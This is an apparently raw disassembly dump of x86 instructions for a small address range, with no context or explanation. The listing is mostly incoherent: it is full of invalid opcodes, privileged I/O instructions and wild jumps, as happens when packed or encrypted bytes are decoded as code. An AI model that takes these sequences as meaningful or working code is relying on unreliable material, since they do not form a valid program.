  402121:	cmp    edx,DWORD PTR [esp+ecx*8-0x29fbd7d]
  402128:	sbb    al,0xfa
  40212a:	test   al,0x95
  40212c:	and    BYTE PTR [eax+0x57],bl
  40212f:	ret    0x689c
  402132:	(bad)  
  402133:	dec    eax
  402134:	cmc    
  402135:	cld    
  402136:	and    eax,0x47b52c67
  40213b:	inc    ebp
  40213c:	mov    edx,0x89137350
  402141:	xchg   DWORD PTR [edx],esp
  402143:	jecxz  0x40218e
  402145:	sbb    BYTE PTR [edx],dl
  402147:	stos   DWORD PTR es:[edi],eax
  402148:	pusha  
  402149:	(bad)  
  40214b:	xor    DWORD PTR [edi+0x41],edi
  40214e:	cmp    eax,0xd96c8723
  402153:	fadd   st(4),st
  402155:	sbb    ebx,DWORD PTR [ebx+0xb]
  402158:	jnp    0x402161
  40215a:	ret    0x4be0
  40215d:	jnp    0x40217f
  40215f:	xor    BYTE PTR [ebp+0x552b5129],ah
  402165:	and    al,0xb2
  402167:	out    dx,eax
  402168:	fsubrp st(0),st
  40216a:	adc    al,0x7f
  40216c:	pusha  
  40216d:	add    eax,0x161911e9
  402172:	sub    al,0x6a
  402174:	and    bh,0x5f
  402177:	(bad)  
  402178:	imul   ecx,DWORD PTR [ecx+eax*4-0x43de85bc],0x822d4b5a
  402183:	cmp    BYTE PTR [edi+0x30],dh
  402186:	jns    0x4021aa
  402188:	cmp    eax,0x687e6c7c
  40218d:	stos   BYTE PTR es:[edi],al
  40218e:	xchg   bh,cl
  402190:	data16 mov ch,0x6e
  402193:	xchg   ebx,eax
  402194:	cld    
  402195:	jae    0x402177
  402197:	jle    0x402137
  402199:	and    BYTE PTR [esi+edx*2+0x14a2a04b],ch
  4021a0:	into   
  4021a1:	jle    0x4021d2
  4021a3:	and    eax,0x7bd987fb
  4021a8:	mov    cl,dh
  4021aa:	idiv   DWORD PTR [ebx]
  4021ac:	loope  0x402149
  4021ae:	fdivrp st(4),st
  4021b0:	pop    esp
  4021b1:	dec    edx
  4021b2:	ss jns 0x4021fd
  4021b5:	fsub   DWORD PTR [ecx-0x4e]
  4021b8:	clc    
  4021b9:	dec    edi
  4021ba:	data16 xor al,0x1c
  4021bd:	ret    0xfdba
  4021c0:	(bad)  
  4021c1:	fisub  WORD PTR [eax]
  4021c3:	popa   
  4021c4:	cmp    DWORD PTR [edx+0x45d3b741],esp
  4021ca:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4021cc:	dec    edi
  4021cd:	mov    esi,0x9208ddd6
  4021d2:	xchg   DWORD PTR [ebx-0x14dfd704],esp
  4021d8:	icebp  
  4021d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021db:	addr16 or eax,0xfb269e62
  4021e1:	jne    0x40216e
  4021e3:	stc    
  4021e4:	xlat   BYTE PTR ds:[ebx]
  4021e5:	mov    ch,0xfd
  4021e7:	pop    esp
  4021e8:	and    BYTE PTR [ebx],dh
  4021ea:	ins    BYTE PTR es:[edi],dx
  4021eb:	fucom  st(3)
  4021ed:	test   al,0x4b
  4021ef:	jnp    0x4021b8
  4021f1:	jecxz  0x402218
  4021f3:	dec    edi
  4021f4:	mov    al,0x85
  4021f6:	sbb    eax,DWORD PTR ds:0xa638a41e
  4021fc:	mov    ch,0x9a
  4021fe:	mov    WORD PTR [eax],fs
  402200:	add    al,0x32
  402202:	in     al,0x81
  402204:	push   esi
  402205:	stos   BYTE PTR es:[edi],al
  402206:	jb     0x40220f
  402208:	hlt    
  402209:	scas   eax,DWORD PTR es:[edi]
  40220a:	and    BYTE PTR [edi-0x4859c57b],al
  402210:	and    eax,0xf48cbfa
  402215:	inc    ecx
  402216:	mov    eax,ds:0xbdf7005b
  40221b:	sub    al,0x16
  40221d:	outs   dx,DWORD PTR ds:[esi]
  40221e:	pop    esp
  40221f:	out    dx,eax
  402220:	mov    ah,0xdd
  402222:	xchg   ebp,eax
  402223:	fcomip st,st(6)
  402225:	mov    BYTE PTR [ebx-0x1361eeb],bl
  40222b:	inc    edx
  40222c:	xchg   esi,eax
  40222d:	dec    bx
  40222f:	out    0xf,eax
  402231:	mov    edx,0xebd95be7
  402236:	fimul  DWORD PTR [ebx-0x87bd206]
  40223c:	xchg   BYTE PTR [edx-0x42002414],bl
  402242:	div    BYTE PTR [edi-0x8]
  402245:	mov    ch,0x9e
  402247:	and    BYTE PTR [esi],dl
  402249:	aam    0xc2
  40224b:	pop    esi
  40224c:	icebp  
  40224d:	addr16 ret 0x51e2
  402251:	and    DWORD PTR [ebx-0x6a85c644],eax
  402257:	cmp    eax,0x2ea00d0
  40225c:	dec    ebx
  40225d:	dec    eax
  40225e:	test   eax,edi
  402260:	(bad)  
  402261:	mov    dl,0x5d
  402263:	xchg   ebp,eax
  402264:	sub    esi,DWORD PTR [ebp-0x3d]
  402267:	fidiv  DWORD PTR [edi-0x2d2ecf55]
  40226d:	cld    
  40226e:	in     eax,dx
  40226f:	and    edi,DWORD PTR [edi]
  402271:	adc    eax,0x8fccace
  402276:	ficomp DWORD PTR [ebp-0xe78b7e6]
  40227c:	xlat   BYTE PTR ds:[ebx]
  40227d:	mov    DWORD PTR [ecx],edi
  40227f:	adc    al,0x48
  402281:	sahf   
  402282:	sub    DWORD PTR [ebx-0x3b],0x3
  402286:	cli    
  402287:	mov    cl,0x84
  402289:	sti    
  40228a:	fsubr  DWORD PTR [eax]
  40228c:	sbb    DWORD PTR [ebp+eiz*1-0x55],esi
  402290:	scas   eax,DWORD PTR es:[edi]
  402291:	in     al,0x56
  402293:	cwde   
  402294:	scas   al,BYTE PTR es:[edi]
  402295:	outs   dx,DWORD PTR ds:[esi]
  402296:	dec    eax
  402297:	in     al,dx
  402298:	cs fsubrp st(2),st
  40229b:	inc    eax
  40229c:	jae    0x4022bc
  40229e:	pusha  
  40229f:	dec    eax
  4022a0:	or     eax,esp
  4022a2:	xchg   ecx,eax
  4022a3:	sub    al,0x9a
  4022a5:	push   0xd9e45acb
  4022aa:	out    dx,al
  4022ab:	and    eax,esi
  4022ad:	push   0xd1610c9f
  4022b2:	mov    eax,0xbdd5a937
  4022b7:	pushf  
  4022b8:	jo     0x4022cf
  4022ba:	fadd   st(7),st
  4022bc:	ss das 
  4022be:	push   0xffffffaa
  4022c0:	mov    WORD PTR [esi-0x32],?
  4022c3:	mov    esi,0xc5cb5f96
  4022c8:	push   es
  4022c9:	int3   
  4022ca:	loop   0x402336
  4022cc:	fild   DWORD PTR [edx]
  4022ce:	xchg   BYTE PTR [edi],cl
  4022d0:	dec    esi
  4022d1:	push   ss
  4022d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022d3:	aam    0x88
  4022d5:	sbb    BYTE PTR [ebp+0x55f05a90],0x49
  4022dc:	cmp    ah,BYTE PTR [eax+0xa4505db]
  4022e2:	ja     0x402328
  4022e4:	into   
  4022e5:	xor    ebx,0x11
  4022e8:	xor    eax,ebx
  4022ea:	(bad)  
  4022eb:	sbb    BYTE PTR [ecx],bh
  4022ed:	cmp    edx,DWORD PTR [esi]
  4022ef:	inc    esp
  4022f0:	inc    edx
  4022f1:	mov    al,ds:0xc73d5ac9
  4022f6:	mov    esp,0x11e6f6c2
  4022fb:	dec    edi
  4022fc:	xchg   ecx,eax
  4022fd:	xchg   ebp,eax
  4022fe:	loope  0x40229a
  402300:	xor    DWORD PTR [edx+0x10a8ae8e],0xc69e1374
  40230a:	jno    0x4022d6
  40230c:	int3   
  40230d:	(bad)  
  40230e:	pop    ecx
  40230f:	loop   0x402352
  402311:	xchg   ebp,eax
  402312:	loop   0x402338
  402314:	mov    eax,ds:0x5a024d87
  402319:	sub    dl,bh
  40231b:	push   ss
  40231c:	pop    eax
  40231d:	xchg   esp,eax
  40231e:	sti    
  40231f:	xor    ebp,DWORD PTR [edx]
  402321:	fcmove st,st(5)
  402323:	out    dx,eax
  402324:	fistp  QWORD PTR [esi+0x6e44df03]
  40232a:	mov    dl,0x7c
  40232c:	mov    ds:0xf28c5b45,al
  402331:	lock popa 
  402333:	jns    0x40238b
  402335:	jbe    0x40230f
  402337:	push   ebx
  402338:	cmp    edi,ecx
  40233a:	jo     0x402300
  40233c:	push   edx
  40233d:	adc    eax,0x34a73520
  402342:	adc    bh,BYTE PTR [ebp+0x5a]
  402345:	dec    edx
  402346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402347:	sbb    ecx,eax
  402349:	shr    DWORD PTR [edi+edx*2],cl
  40234c:	jnp    0x4022d4
  40234e:	dec    edi
  40234f:	sub    bh,BYTE PTR [eax-0x7dc6159]
  402355:	sti    
  402356:	pop    es
  402357:	fbld   TBYTE PTR ds:0xd2708ff9
  40235d:	push   es
  40235e:	or     ah,BYTE PTR [ecx]
  402360:	mov    esp,0x24261b79
  402365:	ins    BYTE PTR es:[edi],dx
  402366:	stos   BYTE PTR es:[edi],al
  402367:	sub    eax,DWORD PTR [ebp+0x77201581]
  40236d:	push   esp
  40236e:	aaa    
  40236f:	(bad)  [ecx-0x43f283cc]
  402375:	mov    bl,0x86
  402377:	fwait
  402378:	dec    esp
  402379:	pop    es
  40237a:	sub    DWORD PTR [edi*2-0x416d21],0x74
  402382:	or     edx,DWORD PTR [ebp+0x20a7348a]
  402388:	push   0xffffffdb
  40238a:	jp     0x402351
  40238c:	mov    eax,ds:0x1e2e6584
  402391:	pop    ebx
  402392:	pop    ds
  402393:	scas   eax,DWORD PTR es:[edi]
  402394:	push   es
  402395:	jmp    0x83fb3e27
  40239a:	mov    ah,0x39
  40239c:	and    al,0x2a
  40239e:	ret    0x9854
  4023a1:	push   0x43
  4023a3:	lock enter 0x4493,0xc4
  4023a8:	(bad)  
  4023a9:	pushf  
  4023aa:	jmp    0x8107136f
  4023af:	sbb    DWORD PTR [edx+ebx*2-0x71bb0163],edx
  4023b6:	pushf  
  4023b7:	mov    esi,0x2813cdf
  4023bc:	cmp    eax,0x4b4b117d
  4023c1:	pop    ebp
  4023c2:	pop    es
  4023c3:	(bad)  
  4023c4:	ja     0x40238d
  4023c6:	sbb    eax,0x915c566
  4023cb:	and    esi,esp
  4023cd:	pop    edi
  4023ce:	ins    BYTE PTR es:[edi],dx
  4023cf:	icebp  
  4023d0:	or     edx,DWORD PTR [eax]
  4023d2:	pop    ds
  4023d3:	adc    al,bh
  4023d5:	sub    cl,ch
  4023d7:	cwde   
  4023d8:	dec    ecx
  4023d9:	inc    ebx
  4023da:	out    0x27,eax
  4023dc:	adc    al,0x85
  4023de:	push   ebx
  4023df:	hlt    
  4023e0:	pop    ebp
  4023e1:	mov    dl,BYTE PTR [ebx+esi*2-0x2e30980a]
  4023e8:	inc    edi
  4023e9:	pop    ecx
  4023ea:	mov    edi,0x39b1fa25
  4023ef:	push   0xf0ce886a
  4023f4:	iret   
  4023f5:	call   0x7bba98dd
  4023fa:	xlat   BYTE PTR ds:[ebx]
  4023fb:	callw  0x193b
  4023ff:	cmp    BYTE PTR [esi+0x28],bl
  402402:	js     0x402409
  402404:	inc    ebp
  402405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402406:	pop    dx
  402408:	sbb    BYTE PTR [esi+0x1d0080a6],ah
  40240e:	jecxz  0x402470
  402410:	out    dx,al
  402411:	xor    BYTE PTR [ecx],ah
  402413:	div    ecx
  402415:	scas   al,BYTE PTR es:[edi]
  402416:	shr    edi,cl
  402418:	nop
  402419:	and    BYTE PTR ds:0x16b801b9,al
  40241f:	push   cs
  402420:	aaa    
  402421:	outs   dx,BYTE PTR ds:[esi]
  402422:	push   ds
  402423:	mov    eax,ds:0xbbd85ca0
  402428:	push   eax
  402429:	push   esi
  40242a:	ins    BYTE PTR es:[edi],dx
  40242b:	je     0x4023d7
  40242d:	xchg   edx,eax
  40242e:	cli    
  40242f:	cmp    esp,DWORD PTR [edx-0x9e857d8]
  402435:	and    cl,BYTE PTR [ebx]
  402437:	gs and al,0x5a
  40243a:	cmp    DWORD PTR [edx+ecx*4],edx
  40243d:	dec    ebp
  40243e:	xchg   DWORD PTR cs:[edi+0x66d1a81],edi
  402445:	popa   
  402446:	scas   eax,DWORD PTR es:[edi]
  402447:	outs   dx,DWORD PTR ds:[esi]
  402448:	(bad)  
  40244a:	and    DWORD PTR [ecx],edi
  40244c:	sub    dh,BYTE PTR [edx-0x1f05fc9c]
  402452:	jg     0x4023d6
  402454:	std    
  402455:	fisub  WORD PTR [esi+ebx*8-0x42d9a6c1]
  40245c:	repz and al,0x1d
  40245f:	cdq    
  402460:	inc    ecx
  402461:	add    DWORD PTR [ecx+0x70],edx
  402464:	arpl   WORD PTR [ebp+0x26],di
  402467:	aaa    
  402468:	mov    bl,0x21
  40246a:	into   
  40246b:	scas   al,BYTE PTR es:[edi]
  40246c:	pop    ds
  40246d:	out    dx,al
  40246e:	ins    BYTE PTR es:[edi],dx
  40246f:	in     al,dx
  402470:	imul   eax,eax,0xffffffd9
  402473:	adc    ebx,DWORD PTR [edx+0x28]
  402476:	popf   
  402477:	mov    BYTE PTR [esi],ch
  402479:	std    
  40247a:	jne    0x4024a8
  40247c:	inc    ebp
  40247d:	xchg   esp,eax
  40247e:	ror    ah,0xd8
  402481:	addr16 inc eax
  402483:	pop    edi
  402484:	(bad)  
  402485:	ins    DWORD PTR es:[edi],dx
  402486:	push   ss
  402487:	mov    eax,ds:0x9fe087c8
  40248c:	cmc    
  40248d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40248e:	or     esi,DWORD PTR [edi+ebx*8]
  402491:	into   
  402492:	test   bl,bl
  402494:	jg     0x4024de
  402496:	or     al,BYTE PTR [eax+0x5342a921]
  40249c:	out    dx,eax
  40249d:	lock dec ecx
  40249f:	lahf   
  4024a0:	scas   al,BYTE PTR es:[edi]
  4024a1:	shl    BYTE PTR [ebx-0x7f],cl
  4024a4:	dec    ebp
  4024a5:	push   edx
  4024a6:	mov    ecx,0x7faeb6e8
  4024ab:	adc    al,0x14
  4024ad:	hlt    
  4024ae:	daa    
  4024af:	pop    edx
  4024b0:	add    dl,BYTE PTR [esi]
  4024b2:	bound  ecx,QWORD PTR [esi-0x79]
  4024b5:	sbb    eax,0x20d6a719
  4024ba:	pop    edi
  4024bb:	shr    edx,0x74
  4024be:	mov    dh,0xcc
  4024c0:	jp     0x40244b
  4024c2:	int3   
  4024c3:	cdq    
  4024c4:	enter  0xa0a5,0x5d
  4024c8:	xor    esp,esi
  4024ca:	in     eax,dx
  4024cb:	push   ss
  4024cc:	icebp  
  4024cd:	leave  
  4024ce:	pop    edx
  4024cf:	inc    ebp
  4024d0:	scas   eax,DWORD PTR es:[edi]
  4024d1:	inc    edi
  4024d2:	int    0xaf
  4024d4:	rcl    bh,1
  4024d6:	lock sbb edx,esi
  4024d9:	mov    ds:0x718ad618,eax
  4024de:	repz cwde 
  4024e0:	xchg   edx,eax
  4024e1:	mov    ?,WORD PTR [ebp-0x413fce7]
  4024e7:	push   ebx
  4024e8:	sub    bl,BYTE PTR [edx]
  4024ea:	test   eax,0xec22efdd
  4024ef:	dec    BYTE PTR [ebx+0x2fa409b2]
  4024f5:	push   ebp
  4024f6:	imul   esp,DWORD PTR [esi-0x7],0xd0876698
  4024fd:	repnz mov ch,0x41
  402500:	pop    ss
  402501:	cmp    DWORD PTR [ebp-0x53972d9e],eax
  402507:	mov    dh,0xf3
  402509:	pop    ds
  40250a:	push   edi
  40250b:	cdq    
  40250c:	scas   eax,DWORD PTR es:[edi]
  40250d:	pop    es
  40250e:	cmc    
  40250f:	adc    DWORD PTR [esi+0x21],esi
  402512:	loop   0x4024bd
  402514:	dec    esp
  402515:	mov    ebx,0x47b515f3
  40251a:	sbb    DWORD PTR [ebp+0x1f02cc7c],edi
  402520:	mov    ?,ebx
  402522:	scas   al,BYTE PTR es:[edi]
  402523:	pop    ds
  402524:	lds    esi,FWORD PTR [eax]
  402526:	fisubr DWORD PTR [edx-0x69]
  402529:	imul   edi,DWORD PTR [ebx],0xf3ffd531
  40252f:	aad    0xd1
  402531:	lods   al,BYTE PTR ds:[esi]
  402532:	sub    eax,DWORD PTR ds:[eax]
  402535:	mov    ecx,0xf789535b
  40253a:	bound  edi,QWORD PTR ds:0x6583c003
  402540:	push   edi
  402541:	shr    DWORD PTR ds:0x84b1c548,1
  402547:	outs   dx,BYTE PTR ds:[esi]
  402548:	mov    BYTE PTR [edi+0x63],0xda
  40254c:	mov    cl,0x5
  40254e:	sub    ebp,DWORD PTR [ebx+0x4d216282]
  402554:	cld    
  402555:	cmp    al,cl
  402557:	aas    
  402558:	popf   
  402559:	push   0xbaa65a47
  40255e:	cdq    
  40255f:	jbe    0x402593
  402561:	mov    ds:0xdb1c855a,eax
  402566:	xchg   edx,eax
  402567:	jne    0x40251f
  402569:	sar    esp,1
  40256b:	sub    eax,0xd5142374
  402570:	xor    al,0x94
  402572:	jae    0x402585
  402574:	fwait
  402575:	xor    BYTE PTR [esi-0x28],ch
  402578:	stos   BYTE PTR es:[edi],al
  402579:	mov    ss,esp
  40257b:	test   eax,0x8ca5e7da
  402580:	(bad)  
  402581:	bnd jmp 0x4eb78685
  402587:	jecxz  0x4025fb
  402589:	icebp  
  40258a:	mov    cl,0x1d
  40258c:	aam    0x6c
  40258e:	jno    0x402530
  402590:	xor    ebp,DWORD PTR [esp+edi*1-0x240f430a]
  402597:	inc    esp
  402598:	call   0x9c83:0xb08cbc39
  40259f:	jmp    0x4025f7
  4025a1:	xchg   DWORD PTR [edi],esp
  4025a3:	jbe    0x402565
  4025a5:	cmp    esi,ebx
  4025a7:	adc    DWORD PTR [ebx-0x6a2ce43f],esp
  4025ad:	mov    bl,0xe6
  4025af:	fist   WORD PTR [ecx+0x525d1e92]
  4025b5:	shl    al,cl
  4025b7:	(bad)  [edi+0x4e271f8d]
  4025bd:	cmp    edx,DWORD PTR [ecx+esi*1-0x29b393e8]
  4025c4:	inc    edi
  4025c5:	jmp    0xff8f:0x32a513b
  4025cc:	push   eax
  4025cd:	adc    BYTE PTR [esi-0x49],al
  4025d0:	adc    cl,BYTE PTR [ecx]
  4025d2:	clc    
  4025d3:	jb     0x40255f
  4025d5:	xchg   ebp,eax
  4025d6:	jbe    0x4025bf
  4025d8:	adc    eax,0x3e85690a
  4025dd:	cdq    
  4025de:	std    
  4025df:	out    dx,eax
  4025e0:	in     eax,dx
  4025e1:	add    BYTE PTR [ecx-0x11],al
  4025e4:	jmp    0xdae64dd0
  4025e9:	aad    0x53
  4025eb:	mov    ah,0xef
  4025ed:	push   esi
  4025ee:	(bad)  
  4025ef:	or     eax,0xab6bb951
  4025f4:	jp     0x402640
  4025f6:	stos   DWORD PTR es:[edi],eax
  4025f7:	jb     0x4025cb
  4025f9:	test   al,0x6c
  4025fb:	adc    eax,0xa33b0bf4
  402600:	iret   
  402601:	ins    BYTE PTR es:[edi],dx
  402602:	cmp    bh,ah
  402604:	sbb    dh,bl
  402606:	call   0xcbb98f44
  40260b:	stos   BYTE PTR es:[edi],al
  40260c:	jne    0x4025f6
  40260e:	add    al,0x1e
  402610:	push   ds
  402611:	rcr    BYTE PTR [edi+0x3a],0x95
  402615:	inc    ecx
  402616:	mov    gs,edi
  402618:	jge    0x40266b
  40261a:	(bad)  
  40261b:	js     0x402619
  40261d:	int    0x80
  40261f:	fsub   QWORD PTR [eax]
  402621:	clc    
  402622:	in     eax,0x6e
  402624:	cmp    al,0x12
  402626:	fnstsw ax
  402628:	add    BYTE PTR [ebp+0x498a3523],ah
  40262e:	mov    WORD PTR [eax],?
  402630:	test   DWORD PTR [ebp+0x3b],0x27ff0031
  402637:	push   ds
  402638:	cmp    esp,edx
  40263a:	sbb    al,BYTE PTR [edi-0x29f3f8e]
  402640:	sub    bl,BYTE PTR [ebx+eax*4+0x4b]
  402644:	push   ecx
  402645:	imul   edi,DWORD PTR [ecx+0x27a201b9],0xfffffffb
  40264c:	or     eax,0xe6fb2f6d
  402651:	ror    bl,1
  402653:	sbb    al,0x7
  402655:	cwde   
  402656:	mov    esp,DWORD PTR ds:0xf4f0cc6b
  40265c:	mov    eax,ds:0x5320e79e
  402661:	jae    0x4025f2
  402663:	int3   
  402664:	or     al,0xfe
  402666:	sub    eax,0x285fb25a
  40266b:	andps  xmm5,XMMWORD PTR [ecx+0x34316ecb]
  402672:	scas   eax,DWORD PTR es:[edi]
  402673:	sahf   
  402674:	or     eax,0xc742907b
  402679:	jbe    0x4026da
  40267b:	lahf   
  40267c:	rcl    DWORD PTR [esi],0x9f
  40267f:	pop    edx
  402680:	setg   BYTE PTR [esi]
  402683:	mov    ebx,0x56dc00fb
  402688:	or     BYTE PTR [esi],ah
  40268a:	aam    0x4d
  40268c:	rcl    DWORD PTR [edi+0x12],1
  40268f:	add    al,0x13
  402691:	sbb    esp,DWORD PTR [ebx]
  402693:	jae    0x4026f7
  402695:	xchg   esp,eax
  402696:	adc    edi,DWORD PTR [eax+0x16]
  402699:	pop    ecx
  40269a:	mov    eax,ds:0x2ee4a6a4
  40269f:	out    dx,al
  4026a0:	cmp    al,0xbf
  4026a2:	adc    BYTE PTR [ecx],al
  4026a4:	mov    ecx,0xeb6dfb31
  4026a9:	ret    
  4026aa:	(bad)  
  4026ab:	je     0x4026ac
  4026ad:	cmp    ah,BYTE PTR [esi-0x56]
  4026b0:	add    dh,BYTE PTR [eax]
  4026b2:	xor    al,0xac
  4026b4:	add    BYTE PTR [eax+0x7e],0x12
  4026b8:	ds jmp 0x387d66a1
  4026be:	sbb    esp,DWORD PTR [eax-0x7c]
  4026c1:	rcr    BYTE PTR [ebx+0x587e2db3],1
  4026c7:	pop    edi
  4026c8:	mov    ebp,0x5e6bc008
  4026cd:	pop    ecx
  4026ce:	sub    ecx,edx
  4026d0:	sub    DWORD PTR [ebx],edx
  4026d2:	or     eax,0xb297c26f
  4026d7:	jmp    0x402757
  4026d9:	sti    
  4026da:	stos   BYTE PTR es:[edi],al
  4026db:	sbb    eax,0xd3fb0fef
  4026e0:	cmp    DWORD PTR [edx+ecx*4-0x50ef6585],ebp
  4026e7:	inc    eax
  4026e8:	pushf  
  4026e9:	mov    al,ds:0xbd1c7e1a
  4026ee:	push   0xfffffff7
  4026f0:	sbb    eax,0xe9d6aff6
  4026f5:	(bad)  
  4026f6:	out    dx,al
  4026f7:	push   ebp
  4026f8:	shr    DWORD PTR [ebp+0x7d],cl
  4026fb:	inc    ecx
  4026fc:	inc    esp
  4026fd:	sar    DWORD PTR [edi+0x74a8b85e],0xec
  402704:	xor    BYTE PTR [edx-0x60],ch
  402707:	push   es
  402708:	std    
  402709:	xchg   ecx,eax
  40270a:	adc    BYTE PTR [eax+0x69893114],0xb1
  402711:	push   esp
  402712:	aas    
  402713:	(bad)  
  402714:	in     eax,0x5
  402716:	mov    ebp,0xb880b990
  40271b:	sub    BYTE PTR [eax+0x26774afb],bh
  402721:	sub    al,0xc6
  402723:	gs jmp 0x4026c0
  402726:	mov    ah,0x3d
  402728:	push   edi
  402729:	cmp    BYTE PTR [ebx-0x686ebf28],dh
  40272f:	retf   0x7ab4
  402732:	inc    edx
  402733:	fprem1 
  402735:	in     eax,0x8f
  402737:	cld    
  402738:	call   0x1375:0x177057cb
  40273f:	mov    edi,0xe34b9c85
  402744:	out    0xe5,al
  402746:	mov    ah,0xb1
  402748:	hlt    
  402749:	enter  0x16ba,0x6
  40274d:	xchg   BYTE PTR [edi-0x2ca9db6a],dh
  402753:	js     0x402770
  402755:	jmp    0x4026f8
  402757:	and    al,dl
  402759:	push   esp
  40275a:	mov    ds:0xabdecd17,eax
  40275f:	dec    edx
  402760:	int    0x37
  402762:	addr16 mov al,cs:0x7c06
  402767:	sbb    eax,0x89b40f85
  40276c:	cmp    BYTE PTR [ecx],0xf7
  40276f:	push   ecx
  402770:	mov    gs,WORD PTR cs:[edi]
  402773:	arpl   WORD PTR [edx+0x589f24d4],di
  402779:	mov    dh,0xe5
  40277b:	mov    cl,0x38
  40277d:	jmp    0x12cf:0x3a9d1d26
  402784:	mov    dl,0x9a
  402786:	and    edi,0x42e87e04
  40278c:	dec    ecx
  40278d:	sbb    al,0x5a
  40278f:	xor    eax,0xdd60fd1f
  402794:	out    0x99,al
  402796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402797:	jo     0x402751
  402799:	ins    DWORD PTR es:[edi],dx
  40279a:	sub    bh,dl
  40279c:	inc    eax
  40279d:	and    al,0xa
  40279f:	xlat   BYTE PTR ds:[ebx]
  4027a0:	inc    esi
  4027a1:	pop    ebp
  4027a2:	push   ss
  4027a3:	cmp    al,0xbb
  4027a5:	mov    eax,0x28ac3c8c
  4027aa:	(bad)  
  4027ab:	outs   dx,BYTE PTR ds:[esi]
  4027ac:	sub    DWORD PTR [edi+edx*8-0x30],edi
  4027b0:	xor    BYTE PTR [ecx-0x62],ch
  4027b3:	mov    BYTE PTR [edi+0x302c88be],bl
  4027b9:	sbb    esi,DWORD PTR fs:[ecx-0x16]
  4027bd:	mov    esi,DWORD PTR [ecx-0x27969fc7]
  4027c3:	popa   
  4027c4:	and    ebx,0x668e4af3
  4027ca:	add    al,al
  4027cc:	xchg   edx,eax
  4027cd:	mov    dh,0x6d
  4027cf:	outs   dx,DWORD PTR ds:[esi]
  4027d0:	sbb    bh,0xf3
  4027d3:	xchg   edi,eax
  4027d4:	pop    ss
  4027d5:	arpl   WORD PTR [ecx+0x58b48f80],bx
  4027db:	loope  0x40284f
  4027dd:	daa    
  4027de:	ret    
  4027df:	cmp    eax,0x56f0abb3
  4027e4:	aas    
  4027e5:	sbb    BYTE PTR [eax+0x75],ch
  4027e8:	mov    ch,0xda
  4027ea:	sbb    eax,0xb76e1fc6
  4027ef:	pop    edx
  4027f0:	syscall 
  4027f2:	icebp  
  4027f3:	dec    DWORD PTR [edx-0x7695b1c1]
  4027f9:	test   eax,0xdb05f1bd
  4027fe:	push   ecx
  4027ff:	ret    
  402800:	pop    es
  402801:	mov    ah,0xf6
  402803:	shr    BYTE PTR [esi+0x3b9e7050],1
  402809:	ja     0x40284c
  40280b:	loope  0x4027f0
  40280d:	jns    0x40283a
  40280f:	dec    ecx
  402810:	ins    BYTE PTR es:[edi],dx
  402811:	fadd   st(5),st
  402813:	pushf  
  402814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402815:	dec    edi
  402816:	push   0x48d62a0
  40281b:	mov    ebp,0xfaba2d87
  402820:	test   BYTE PTR [ecx+0xb],0x76
  402824:	dec    cx
  402826:	(bad)  
  402827:	bound  ebx,QWORD PTR [ebx+0x3c]
  40282a:	scas   eax,DWORD PTR es:[edi]
  40282b:	outs   dx,DWORD PTR ds:[esi]
  40282c:	(bad)  
  40282d:	aaa    
  40282e:	setl   cl
  402831:	dec    ebp
  402832:	dec    ecx
  402833:	jp     0x40284e
  402835:	xchg   edx,eax
  402836:	jp     0x40286c
  402838:	out    0xa7,al
  40283a:	cmp    al,BYTE PTR [ebx+ebp*1-0x3]
  40283e:	test   al,0x49
  402840:	pop    edi
  402841:	add    bl,BYTE PTR [eax]
  402843:	idiv   DWORD PTR [eax-0x6]
  402846:	jo     0x402802
  402848:	icebp  
  402849:	push   esi
  40284a:	loope  0x402860
  40284c:	aaa    
  40284d:	ret    0xc9af
  402850:	push   ebp
  402851:	jp     0x402846
  402853:	retf   
  402854:	and    eax,DWORD PTR [edx]
  402856:	loop   0x402882
  402858:	(bad)  
  402859:	adc    DWORD PTR [ebx-0x479ddc9a],edi
  40285f:	xchg   ecx,eax
  402860:	pop    eax
  402861:	or     esi,DWORD PTR [esi+0x49]
  402864:	or     ch,BYTE PTR [ecx+0x79d25c1a]
  40286a:	or     bl,dh
  40286c:	push   0xffffff90
  40286e:	call   0x1ec6ba0d
  402873:	enter  0x225d,0x77
  402877:	retf   0x31d2
  40287a:	popa   
  40287b:	fidivr WORD PTR [eax+eiz*8+0x69]
  40287f:	or     BYTE PTR [ebp+0x4abf788e],ah
  402885:	(bad)
  402889:	cmp    BYTE PTR [ecx-0x211b2943],0x16
  402890:	xchg   esi,eax
  402891:	xor    BYTE PTR [ebx],bl
  402893:	(bad)  
  402894:	push   eax
  402895:	ret    
  402896:	int    0x7d
  402898:	mov    ebx,0x242b3798
  40289d:	xor    DWORD PTR [edi-0x5282156d],ecx
  4028a3:	sub    DWORD PTR [ebx-0x2d],esp
  4028a6:	inc    ebp
  4028a7:	ficom  WORD PTR [edx-0x2d9b1856]
  4028ad:	pop    edx
  4028ae:	xchg   ebx,eax
  4028af:	popa   
  4028b0:	clc    
  4028b1:	add    ecx,eax
  4028b3:	inc    esp
  4028b4:	neg    DWORD PTR [edx-0x58]
  4028b7:	sub    cl,BYTE PTR [ebp+edi*8+0x4043d126]
  4028be:	in     eax,dx
  4028bf:	jo     0x40287a
  4028c1:	mov    ecx,0xe1e54a23
  4028c6:	test   edx,edi
  4028c8:	in     al,dx
  4028c9:	sar    al,1
  4028cb:	mov    dh,0x73
  4028cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028ce:	push   ss
  4028cf:	popf   
  4028d0:	popa   
  4028d1:	dec    eax
  4028d2:	cmp    ebp,DWORD PTR [edx+0x2260d9df]
  4028d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028d9:	inc    edi
  4028da:	int    0x1
  4028dc:	xchg   edx,eax
  4028dd:	dec    ebp
  4028de:	inc    esp
  4028df:	test   ebx,edx
  4028e1:	lods   al,BYTE PTR ds:[esi]
  4028e2:	sbb    DWORD PTR [ebp-0x683b58],esp
  4028e8:	shl    DWORD PTR [esi+0x69db0569],cl
  4028ee:	ins    BYTE PTR es:[edi],dx
  4028ef:	cs dec esp
  4028f1:	mov    ds:0x61231957,al
